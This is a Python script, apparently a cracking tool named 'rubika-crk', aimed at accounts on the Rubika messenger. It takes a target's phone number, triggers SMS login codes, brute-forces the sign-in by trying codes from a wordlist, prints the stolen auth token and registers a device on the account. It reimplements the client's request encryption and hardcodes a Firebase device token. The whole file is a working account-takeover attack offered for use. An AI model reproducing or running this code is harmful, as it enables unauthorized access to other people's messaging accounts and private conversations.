#!/bin/python
from os import system
try: from pyfiglet import figlet_format
except ModuleNotFoundError: system('pip3 install pyfiglet'); from pyfiglet import figlet_format
try: from webbrowser import open as opn
except ModuleNotFoundError: system('pip3 install webbrowser'); import webbrowser
try: from requests import post
except ModuleNotFoundError: system('pip3 install requests'); from requests import post
from time import sleep; from random import randint, choice; from json import loads, dumps, JSONDecodeError; from Crypto.Cipher import AES; from Crypto.Util.Padding import pad, unpad; from time import sleep; import base64,urllib3; from platform import system as sm; from sys import argv
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # warnings
class clients:
    web: dict = {
        "app_name"  :   "Main",
        "app_version"   :   "4.0.8",
        "platform"  :   "Web",
        "package"   :   "web.rubika.ir",
        "lang_code" :   "fa"
        }
    android: dict = {
        "app_name"    : "Main",
        "app_version" : "2.8.1",
        "platform"    : "Android",
        "package"     : "ir.resaneh1.iptv",
        "lang_code"   : "fa"
    }
defaultDevice: dict = {
    "app_version":"MA_2.9.8",
    "device_hash":"CEF34215E3E610825DC1C4BF9864D47A",
    "device_model":"rubika-library",
    "is_multi_account": False,
    "lang_code":"fa",
    "system_version":"SDK 22",
    "token":"cgpzI3mbTPKddhgKQV9lwS:APA91bE3ZrCdFosZAm5qUaG29xJhCjzw37wE4CdzAwZTawnHZM_hwZYbPPmBedllAHlm60v5N2ms-0OIqJuFd5dWRAqac2Ov-gBzyjMx5FEBJ_7nbBv5z6hl4_XiJ3wRMcVtxCVM9TA-",
    "token_type":"Firebase"
}
class encryption:
    def __init__(self, auth):
        self.key = bytearray(self.secret(auth), "UTF-8")
        self.iv = bytearray.fromhex('00000000000000000000000000000000')
    def replaceCharAt(self, e, t, i):
        return e[0:t] + i + e[t + len(i):]
    def secret(self, e):
        t = e[0:8]
        i = e[8:16]
        n = e[16:24] + t + e[24:32] + i
        s = 0
        while s < len(n):
            e = n[s]
            if e >= '0' and e <= '9':
                t = chr((ord(e[0]) - ord('0') + 5) % 10 + ord('0'))
                n = self.replaceCharAt(n, s, t)
            else:
                t = chr((ord(e[0]) - ord('a') + 9) % 26 + ord('a'))
                n = self.replaceCharAt(n, s, t)
            s += 1
        return n
    def encrypt(self, text):
        raw = pad(text.encode('UTF-8'), AES.block_size)
        aes = AES.new(self.key, AES.MODE_CBC, self.iv)
        enc = aes.encrypt(raw)
        result = base64.b64encode(enc).decode('UTF-8')
        return result
    def decrypt(self, text):
        aes = AES.new(self.key, AES.MODE_CBC, self.iv)
        dec = aes.decrypt(base64.urlsafe_b64decode(text.encode('UTF-8')))
        result = unpad(dec, AES.block_size).decode('UTF-8')
        return result
class Send:
    def url():
        server = ['https://messengerg2c37.iranlms.ir/', 'https://messengerg2c64.iranlms.ir/', 'https://messengerg2c26.iranlms.ir' ,'https://messengerg2c46.iranlms.ir' ,'https://messengerg2c39.iranlms.ir']
        host : str = (choice(server))
        return host
    def _tmpGeneration() -> str:
        tmp_session = ''
        choices = [*"abcdefghijklmnopqrstuvwxyz0123456789"]
        for i in range(32): tmp_session += choice(choices)
        return tmp_session
    def sendCode(phone_number) -> dict:
        tmp = Send._tmpGeneration()
        enc = encryption(tmp)
        return loads(enc.decrypt(post(json={"api_version":"5","tmp_session": tmp,"data_enc": enc.encrypt(dumps({
            "method":"sendCode",
            "input":{
                "phone_number":f"98{phone_number[1:]}",
                "send_type":"SMS"
            },
            "client": clients.web
        }))},url=Send.url()).json()["data_enc"])) # type send is SMS
    def signIn(phone_number:str, phone_code_hash:str, phone_code:str):
        tmp = Send._tmpGeneration()
        enc = encryption(tmp)
        return loads(enc.decrypt(post(json={"api_version":"5","tmp_session": tmp,"data_enc":enc.encrypt(dumps({
            "method":"signIn",
            "input":{
                "phone_number":f"98{phone_number[1:]}",
                "phone_code_hash":phone_code_hash,
                "phone_code":phone_code
            },
            "client": clients.web
        }))},url=Send.url()).json().get("data_enc")))
    def registerDevice(auth, device=defaultDevice):
        while 1:
            try:
                enc = encryption(auth)
                response = loads(enc.decrypt(post(json={
                    "api_version":"4",
                    "auth":auth,
                    "client": clients.android,
                    "data_enc":enc.encrypt(dumps(device)),
                    "method":"registerDevice",
                },url=Send.url()).json()["data_enc"]))
                return response
            except JSONDecodeError: break
class Run:
    hash : list = []
    def Running():
        stm: str = sm()
        if 'linux' in stm.lower() or 'mac' in stm.lower():
            system('clear')
        else:
            system('cls')
        bnrs : list = ['rubika . ir', 'web.rubika.ir', 'c rack er', 'rubika-crk']; bnr:str = choice(bnrs); banner: str = figlet_format(bnr)
        [(print('\033[95m'+banners, flush=True, end=''), sleep(0.001)) for banners in banner]
        phone : str = input('\n\033[31m[?] \033[92mplease enter target phone number [09*********] \033[31m=>\033[0m ')
        if '+98' in phone:
            phone.replace('+98', '0')
        elif phone[0] == '9':
            phone = '0' + phone
        elif not phone[:2] == '09':
            while 1:
                print('\n\033[31m[!] > phone is not true.')
                phone : str = input('\n\033[31m[?] \033[92mplease enter target phone number [09*********] \033[31m=>\033[0m ')
                if len(phone) == 11:
                    break
                else:
                    pass
        elif not len(phone) == 11:
            while 1:
                print('\n\033[31m[!] > phone is not true.')
                phone : str = input('\n\033[31m[?] \033[92mplease enter target phone number [09*********] \033[31m=>\033[0m ')
                if len(phone) == 11:
                    break
                else:
                    pass
        try:
            codes = open(str(input('\n\033[31m[?] \033[20;37mplease enter your file code \033[31m=> \033[20;37m')), 'r+').read().split('\n')
        except:
            while 1:
                try:
                    print('\n\033[31m[!] file not found.\n')
                    codes = open(str(input('\n\033[31m[?] \033[20;37mplease enter your file code \033[31m=>\033[20;37m ')), 'r+').read().split('\n')
                    break
                except:
                    pass
        try:
            for i in range(5):
                try:
                    sent: dict = Send.sendCode(phone)
                    if sent['status'] == 'OK':
                        Run.hash.append(sent['data']['phone_code_hash'])
                        break
                    else:
                        pass
                except:
                    pass
                if i == 4:
                    print('\n\033[31m[! > \033[35mphone number is report or usage password')
                    quit()
        except:
            pass
        print('\n\n\033[31m[+] \033[92mtarget \033[93m: \033[31m {}'.format(str(phone)))
        print('\n\033[31m[*] \033[36mplease openning rubika login panel \033[93m: \033[31mweb.rubika.ir\n')
        try:
            swith: str = str(argv[1])
            if '-y' in swith.lower():
                opn('https://web.rubika.ir')
        except:
            pass
        for code in codes:
            code: str = str(code)
            sleep(0.7)
            for j in range(5):
                try:
                    snt: dict = Send.signIn(phone, str(Run.hash[0]), code)
                    Run.hash.append(snt)
                    break
                except:
                    pass
            try:
                test = Run.hash[1]
            except:
                print('\n\033[31m[!] target phone number by rubika is banned')
            if 'auth' in Run.hash[1]: # or if startswith('auth') ...
                snt_ = Run.hash[1]['data']['auth']
                print(f'\n\033[31m[*] \033[36myou logined code is\033[93m: \033[92m{code} \033[36mand auth is\033[93m: \033[92m{snt_} \033[36mtime for use 1 mins\n')
                for k in range(5):
                    try:
                        assert Send.registerDevice(str(snt_), device=defaultDevice)
                        break
                    except:
                        pass
                sleep(3)
            elif Run.hash[1]['status'] == 'ERROR_GENERIC':
                print(f'\033[31m[!] \033[0mcode is false\033[92m: \033[93m{code}')
            else:
                print(f'\033[31m[!] \033[0mcode is false\033[92m: \033[93m{code}')
if __name__ == '__main__':
    Run.Running()
